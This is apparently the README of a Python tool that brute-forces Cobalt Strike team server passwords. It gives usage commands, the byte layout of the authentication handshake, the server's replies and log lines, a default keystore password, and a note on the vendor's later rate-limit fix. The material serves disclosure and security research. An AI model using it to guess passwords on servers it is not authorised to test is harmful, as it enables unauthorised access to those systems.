# csbruter.py

Script to brute force Cobalt Strike team server passwords.

## Usage

```
python3 csbruter.py [-h] [-p PORT] [-t THREADS] host [wordlist]
```

Default port is 50050. Wordlist can be supplied via stdin as such:

```
cat wordlist.txt | python3 csbruter.py 192.168.1.1
```

Tested at up to 138 attempts per second.

## Issue

Cobalt Strike team server has no mitigation for password brute force
attacks.

### Mitigation Update

Cobalt Strike 3.10 (Released Dec 11, 2017) imposes a 1 second delay between attempts as a mitigation for this attack.

## Background

The Cobalt Strike team server requires two types of authentication. The
first is a raw data type of authentication ostensibly used to protect
the socket. The second is a Java serialized object based authentication
which includes the mostly symbolic user name. This script attempts to
brute force the former authentication type, which includes no rate
limiting or account lockout mechanism.

Both of these authentication types are wrapped in an SSL socket, with
a certificate containing following subject:

```
/C=Earth/ST=Cyberspace/L=Somewhere/O=cobaltstrike/OU=AdvancedPenTesting/CN=Major Cobalt Strike
```

This certificate is baked into the Cobalt Strike Java Keystore
cobaltstrike.store, which is easier to change if you use one of the
default keystore passwords: 123456

The first authentication request is defined roughly as such in a fixed
261 byte length command:

```
4 Byte Magic \x00\x00\xBE\xEF
1 Byte Password Length (unsigned int)
Password (unsigned int cast char array)
Padding \x65 "A" * ( Length( Password ) - 256 )
```

Which, on the wire, looks roughly like this, however the padding is
ignored and can be anything. The authentication routine will read up to
256 of Length.

```
\x00\x00\xBE\xEF\x08passwordAAAAAAAAAAAAAA...AAAA
```

If the password supplied matches the password defined when starting the
team server, the team server replies with a 4 byte magic. This password
can not be empty (zero length).

```
\x00\x00\xCA\xFE
```

Otherwise, the team server returns null

```
\x00\x00\x00\x00
```

Once this phase is completed successfully, the team server expects a
serialized object class called Request.

On the team server, the following log entries are sent to stdout during
brute force authentication.

Invalid password:
```
[-] rejected client from 192.168.1.1: invalid password
```

Valid password:
```
[!] Trapped java.io.EOFException during client (192.168.1.1) read [Manage: unauth'd user]: null
```

An error is thrown because the socket is closed immediately after an
attempt.